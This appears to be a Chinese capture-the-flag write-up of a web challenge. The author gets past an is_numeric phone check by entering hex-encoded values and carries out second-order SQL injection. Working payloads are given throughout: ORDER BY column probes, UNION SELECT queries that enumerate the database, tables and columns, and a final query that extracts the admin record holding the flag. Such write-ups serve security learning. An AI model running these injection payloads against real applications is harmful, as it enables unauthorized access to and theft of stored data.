题目是酱紫的

于是去注册一个账号,用户名密码皆为gou,phone:123,登录后


有个check按钮 点击后


查阅下HTML源码





大概清楚了流程，那尝试截断注入admin账号

用admin                                   后面无数空格，密码123，注册失败


 

再尝试用户名注册时SQL注入时失败，注册时填写电话号码后面加个单引号提示phone must be numbers

突然想到 会不会服务端验证phone 是用了is_numeric

 

注册 gou1 gou1 0x27 后登录


果然如此

点击check

SQL错误了

 

应该是有注入的 结合提示，应该是注入出admin的电话号码即可得到flag

 

尝试mysql报错注入 失败，这里不打印mysql错误

测试/*注释符被过滤。


多次测试后 用0x313332206f7264657220627920312023

既132 order by 1 # 注入成功

 

注册gou2 gou2 0x313332206f7264657220627920312023（132 order by 1 #）

点击check

返回There only 1 people use the same phone as you

注册gou3 gou3 0x313332206f72646572206279203223(132 order by 2 #)

点击check

返回db error!

 

说明字段只有一个 尝试回显

 

注入132 union select database()#

返回了

There only 3 people use the same phone as you

There only webdb people use the same phone as you

 成功回显并得到数据库名为webdb

 

再注入

132 union select group_concat(table_name) from information_schema.tables where table_schema='webdb'#

得到表名

 There only 4 people use the same phone as you

There only user people use the same phone as you

 

 注入

132 union select group_concat(column_name) from information_schema.columns where table_name='user' and table_schema='webdb'#

得到字段名

There only 5 people use the same phone as you

There only id,username,phone,password people use the same phone as you

 

最后一击

注入 

132 union select phone from user where username='admin'#

返回

There only 6 people use the same phone as you

There only flag{19cabced-d09b-4706-afdb-23c8bd202ef2} people use the same phone as you

 

Done
